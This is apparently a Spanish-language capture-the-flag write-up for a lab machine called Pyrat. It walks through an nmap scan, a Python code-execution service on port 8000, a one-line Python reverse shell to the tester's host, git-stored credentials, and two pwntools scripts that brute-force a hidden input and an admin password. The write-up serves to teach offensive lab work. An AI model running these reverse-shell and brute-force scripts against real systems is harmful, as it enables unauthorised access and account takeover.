# Introducción

Pyrat recibe curiosas respuestas del servidor HTTP, gracias a esto tenemos una vulnerabilidad de ejecución de código con python. Crafteando nuestro propio payload, es posible ganar shell en la máquina. Dentro de los directorios, el autor tiene que recuperar los archivos del usuario con las credenciales de acceso.

# Conectivdad

![image](https://github.com/user-attachments/assets/90129f4d-d4f1-4170-947c-fbe9d6032629)

# Enumeración

```
sudo nmap -sCV -T4 --min-rate 4000 10.10.236.19
Starting Nmap 7.80 ( https://nmap.org ) at 2025-01-24 09:41 GMT
Nmap scan report for 10.10.236.19
Host is up (0.031s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
8000/tcp open  http-alt SimpleHTTP/0.6 Python/3.11.2
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, JavaRMI, LANDesk-RC, NotesRPC, Socks4, X11Probe, afp, giop: 
|     source code string cannot contain null bytes
|   FourOhFourRequest, LPDString, SIPOptions: 
|     invalid syntax (<string>, line 1)
|   GetRequest: 
|     name 'GET' is not defined
|   HTTPOptions, RTSPRequest: 
|     name 'OPTIONS' is not defined
|   Help: 
|_    name 'HELP' is not defined
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: SimpleHTTP/0.6 Python/3.11.2
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
```

- 22 / SSH
- 8000 / HTTP - Simple HTTP/0.6

Si probamos a conectarnos a la página, aunque sea con curl, netcat o nc 

![image](https://github.com/user-attachments/assets/6b5db52f-f3c7-4abc-a437-501b0d390cc0)

Vamos a ver si encontramos algun vector

Si nos metemos vía telnet

```
telnet ip puerto
```

COmprobamos comandos y por ejemplo si metemos un print("hello") nos saca un print con lo cuál yo metería una rev shell en python directmaente

Podemos hacerlo vía nc también si queremos no hay problema, nos vamos al reverse shell generator e intenramos sacarla, seguramente nos de eror por que como ya estamos dentro de python deberemos quitar los primero argumentos y que quede tal que así:

# Explotación

```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.172.19",9000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
```

Una vez tengamos el listener estaremos dentro de la máquina y podremos enumerar

Si vamos enumerando archivos principales como el /opt por ejemplo encontraremos información relevante.

Primero de todo nos encontraremo en la ruta root, yo he hecho un listener con rlwrap osea que no tengo la necesidad de upgradear la shell, posteriormente enumeraremos por ejemplo opt ls /opt

Encotramos un fichero llamado /dev y dentro el .git

Aquí he encontrado el archivo config

```
www-data@Pyrat:/opt/dev/.git$ cat config
cat config
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[user]
    	name = Jose Mario
    	email = josemlwdf@github.com

[credential]
    	helper = cache --timeout=3600

[credential "https://github.com"]
    	username = think
    	password = _TH1NKINGPirate$_
```

Con estas credenciales podemos entrar a github, vamos a probar a hacer un su think porque en el directorio home esta este usuario

Estamos dentro de think

Sacamos la flag de usuario

# Escala de privilegios

En sudo -l -l vemos que no tenemos ningún acceso de sudo

Volviendo a lo anterior vemos que como era un archivo git vamos a jugar con lo mismo de git

```
think@Pyrat:/opt/dev$ git status
git status
On branch master
Changes not staged for commit:
  (use "git add/rm <file>..." to update what will be committed)
  (use "git restore <file>..." to discard changes in working directory)
	deleted:    pyrat.py.old

no changes added to commit (use "git add" and/or "git commit -a")
think@Pyrat:/opt/dev$
```

El archivo

```
think@Pyrat:/opt/dev$ git show 0a3c36d66369fd4b07ddca72e5379461a63470bf
commit 0a3c36d66369fd4b07ddca72e5379461a63470bf (HEAD -> master)
Author: Jose Mario <josemlwdf@github.com>
Date:   Wed Jun 21 09:32:14 2023 +0000

    Added shell endpoint

diff --git a/pyrat.py.old b/pyrat.py.old
new file mode 100644
index 0000000..ce425cf
--- /dev/null
+++ b/pyrat.py.old
@@ -0,0 +1,27 @@
+...............................................
+
+def switch_case(client_socket, data):
+    if data == 'some_endpoint':
+        get_this_enpoint(client_socket)
+    else:
+        # Check socket is admin and downgrade if is not aprooved
+        uid = os.getuid()
+        if (uid == 0):
+            change_uid()
+
+        if data == 'shell':
+            shell(client_socket)
+        else:
+            exec_python(client_socket, data)
+
+def shell(client_socket):
+    try:
+        import pty
+        os.dup2(client_socket.fileno(), 0)
+        os.dup2(client_socket.fileno(), 1)
+        os.dup2(client_socket.fileno(), 2)
+        pty.spawn("/bin/sh")
+    except Exception as e:
+        send_data(client_socket, e
+
+...............................................
```

Examinando el codigo

- Si el cliente manda un string sin conocer, esto hace una operacion con el socker,
- Si el cliente manda una string de shell se crea una shell
- Para otro inputs, se pasa la funcion de exec

```
#!/usr/bin/env python3

from pwn import remote, context
import threading

target_ip = "10.10.98.190"
target_port = 8000
wordlist = "/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt"
stop_flag = threading.Event()
num_threads = 100


def brute_force_input(words):
    context.log_level = "error"
    r = remote(target_ip, target_port)
    for word in words:
        if stop_flag.is_set():
            r.close()
            return
        if word == "shell":
            continue
        r.sendline(word.encode())
        output = r.recvline()
        if b'not defined' not in output and b'<string>' not in output and output != b'\n':
                stop_flag.set()
                print(f"[+] Input found: {word}")
                print(f"[+] Output recieved: {output}")
                r.close()
                return
    r.close()
    return


def main():
    words = [line.strip() for line in open(wordlist, "r").readlines()]
    words_length = len(words)
    step = (words_length + num_threads - 1) // num_threads
    threads = []
    for i in range(num_threads):
        start = i * step
        end = min(start + step, words_length)
        if start < words_length:
            thread = threading.Thread(target=brute_force_input, args=(words[start:end],))
            threads.append(thread)
            thread.start()
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
```

Ejecutando el script encontramos la credencial de admin

```
$ python3 brute_force_input.py
[+] Input found: admin
[+] Output recieved: b'Start a fresh client to begin.\n'
```

Probamos a inputearlo

```
$ nc 10.10.98.190 8000
admin
Password:
```

Podemos moficiar el script para hacer una fuerza bruta

```
#!/usr/bin/env python3

from pwn import remote, context
import threading

target_ip = "10.10.98.190"
target_port = 8000
wordlist = "/usr/share/seclists/Passwords/500-worst-passwords.txt"
stop_flag = threading.Event()
num_threads = 100


def brute_force_pass(passwords):
    context.log_level = "error"
    r = remote(target_ip, target_port)
    for i in range(len(passwords)):
        if stop_flag.is_set():
            r.close()
            return
        if i % 3 == 0:
            r.sendline(b"admin")
            r.recvuntil(b"Password:\n")
        r.sendline(passwords[i].encode())
        try:
            if b"shell" in r.recvline(timeout=0.5):
                stop_flag.set()
                print(f"[+] Password found: {passwords[i]}")
                r.close()
                return
        except:
            pass
    r.close()
    return


def main():
    passwords = [line.strip() for line in open(wordlist, "r").readlines()]
    passwords_length = len(passwords)
    step = (passwords_length + num_threads - 1) // num_threads
    threads = []
    for i in range(num_threads):
        start = i * step
        end = min(start + step, passwords_length)
        if start < passwords_length:
            thread = threading.Thread(target=brute_force_pass, args=(passwords[start:end],))
            threads.append(thread)
            thread.start()
    for thread in threads:
        thread.join()


if __name__ == "__main__":
    main()
```

Una vez nos saldra la contraseña cambiamos si necesitamos la url de la ruta

Passowrd FOund: 

```
nc ip 8000
```

admin
pass

shell

GGGGGGGGGGGGG


